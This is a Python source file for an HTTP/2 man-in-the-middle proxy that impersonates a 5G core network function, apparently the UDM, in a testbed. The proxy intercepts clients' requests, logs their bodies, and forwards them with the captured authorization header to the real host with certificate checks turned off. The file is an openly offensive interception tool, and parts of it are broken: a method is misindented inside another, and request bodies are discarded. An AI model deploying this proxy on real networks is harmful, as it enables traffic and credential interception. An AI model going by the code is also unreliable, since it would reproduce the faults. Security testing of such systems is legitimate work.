import asyncio
from h2.config import H2Configuration
from h2.connection import H2Connection
import httpx
from h2.events import *
import json

import threading, time, sys, os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "/app/")))

from src import ip_list


class H2ProxyServer:
    def __init__(self, host, port, target_host, display=False):
        self.host = host
        self.port = port
        self.target_host = target_host
        self.config = H2Configuration(client_side=False)
        self.connections = {}
        self.buffers = {}
        self.display = display

    async def handle_client(self, reader, writer):
        conn = H2Connection(config=self.config)
        conn.initiate_connection()
        writer.write(conn.data_to_send())
        await writer.drain()

        self.connections[writer] = conn

        try:
            while True:
                data = await reader.read(65535)
                if not data:
                    break
                events = conn.receive_data(data)
                for event in events:
                    if isinstance(event, RequestReceived):
                        # Store request headers and initialize an empty data buffer
                        self.buffers[event.stream_id] = {
                            "headers": event.headers,
                            "data": b"",
                        }
                    elif isinstance(event, DataReceived):
                        # Append received data to the corresponding buffer
                        self.buffers[event.stream_id]["data"] += event.data
                    elif isinstance(event, StreamEnded):
                        # Process the complete request
                        await self.process_request(event.stream_id, conn, writer)
                writer.write(conn.data_to_send())
                await writer.drain()
        finally:
            del self.connections[writer]
            writer.close()
            await writer.wait_closed()

    async def process_request(self, stream_id, conn, writer):
        headers = self.buffers[stream_id]["headers"]
        body = self.buffers[stream_id]["data"]
        del self.buffers[stream_id]  # Clear the buffer after retrieving its contents
        headers = {
            name.decode("utf-8"): value.decode("utf-8") for name, value in headers
        }

        ip_source = writer.get_extra_info("peername")[0]
        if ip_source != self.target_host:

            body = self.buffers.pop(stream_id, b"")  # Retrieve and delete the buffer
            with httpx.Client(http1=False, http2=True, verify=False) as client:
                target_url = f'http://{self.target_host}:8000{headers[":path"]}'
                method = headers[":method"]
                headers = {"authorization": headers["authorization"]}

                data = {}
                if body:
                    try:
                        data = json.loads(body.decode("utf-8"))
                        if self.display:
                            print(f"Data received {data}")

                    except json.JSONDecodeError:
                        print("Invalid JSON", body.decode("utf-8"))

                # Send the request to the target server
                if method in ["GET", "DELETE"]:
                    response = client.request(method, target_url, headers=headers)
                elif method == "POST":
                    response = client.request(
                        method, target_url, data=data, headers=headers
                    )
                else:
                    response = client.request(
                        method, target_url, json=data, headers=headers
                    )

                # Prepare response headers
                response_headers = [(k, v) for k, v in response.headers.items()]
                if ":status" not in headers:
                    response_headers = [
                        (":status", str(response.status_code))
                    ] + response_headers

                # Send response headers and data back to the client
                conn.send_headers(stream_id, response_headers, end_stream=False)
                conn.send_data(stream_id, response.content, end_stream=True)
                if self.display:
                    print(
                        f"Forwarded {target_url} from {ip_source} to {self.target_host}"
                    )

        else:
            print(f"Warning : Request from spoofed NF {self.target_host}")

        # --------------------- Making the MITM Server Stoppable --------------------- #

        async def _run_stoppable(self):  # Nommée comme tu veux, ici '_run_stoppable'
            self._server_loop = asyncio.get_running_loop()
            if self.display:
                print(
                    f"[{threading.current_thread().name}] Starting stoppable MITM server on {self.host}:{self.port}..."
                )

            self._server_instance = await asyncio.start_server(
                self.handle_client, self.host, self.port
            )

            async with self._server_instance:

                try:
                    if self.display:
                        print(
                            f"[{threading.current_thread().name}] Stoppable MITM server running, awaiting termination signal..."
                        )
                    await self._server_instance.serve_forever()

                except asyncio.CancelledError:
                    if self.display:
                        print(
                            f"[{threading.current_thread().name}] Stoppable MITM server serve_forever() cancelled."
                        )

                finally:
                    if self.display:
                        print(
                            f"[{threading.current_thread().name}] Closing stoppable MITM server..."
                        )

                    if self._server_instance and self._server_instance.is_serving():
                        self._server_instance.close()
                    await self._server_instance.wait_closed()

                    if self.display:
                        print(
                            f"[{threading.current_thread().name}] Stoppable MITM server closed."
                        )

    def stop_mitm(self):
        if (
            self._server_instance
            and self._server_loop
            and not self._server_loop.is_closed()
        ):
            if self.display:
                print(
                    f"[{threading.current_thread().name}] Requesting MITM server stop from another thread..."
                )

            asyncio.run_coroutine_threadsafe(
                self._server_instance.close(), self._server_loop
            )
        else:
            if self.display:
                print(
                    f"[{threading.current_thread().name}] No running server instance or loop is closed, cannot stop MITM."
                )

    async def run(self):
        # Start the HTTP/2 server
        if self.display:
            print("Starting MITM server")
        server = await asyncio.start_server(self.handle_client, self.host, self.port)
        async with server:
            await server.serve_forever()


def _run_stoppable_mitm_in_thread(proxy_instance):
    asyncio.run(proxy_instance._run_stoppable())


def start_mitm_for(nf_to_replace, seconds):
    if not isinstance(seconds, (int, float)) or seconds <= 0:
        raise ValueError("The 'seconds' duration must be a positive number.")

    print(
        f"[{threading.current_thread().name}] [+] Preparing MITM for {nf_to_replace} for {seconds} seconds..."
    )
    proxy_instance = H2ProxyServer(
        host="0.0.0.0",
        port=8000,
        target_host=nf_to_replace,
        display=True,
    )

    server_thread = threading.Thread(
        target=_run_stoppable_mitm_in_thread,
        args=(proxy_instance,),
        name="MITM_Stoppable_Server_Thread",
    )
    server_thread.start()
    threadName = threading.current_thread().name
    print(
        f"[{threadName}] [i] MITM started in a separate thread. It will automatically stop in {seconds} seconds..."
    )

    time.sleep(seconds)
    print(f"[{threadName}] [-] Time elapsed. Stopping MITM...")
    proxy_instance.stop_mitm()

    print(f"[{threadName}] [i] Waiting for the MITM server thread to complete...")
    server_thread.join()
    print(
        f"[{threadName}] [+] MITM stopped and thread terminated. Mission accomplished!"
    )


def start_mitm(nf_to_replace):
    # Initialize and start the proxy server
    proxy = H2ProxyServer(
        host="0.0.0.0", port=8000, target_host=nf_to_replace, display=True
    )
    asyncio.run(proxy.run())


if __name__ == "__main__":
    start_mitm_for(nf_to_replace=ip_list["UDM"], seconds=10)
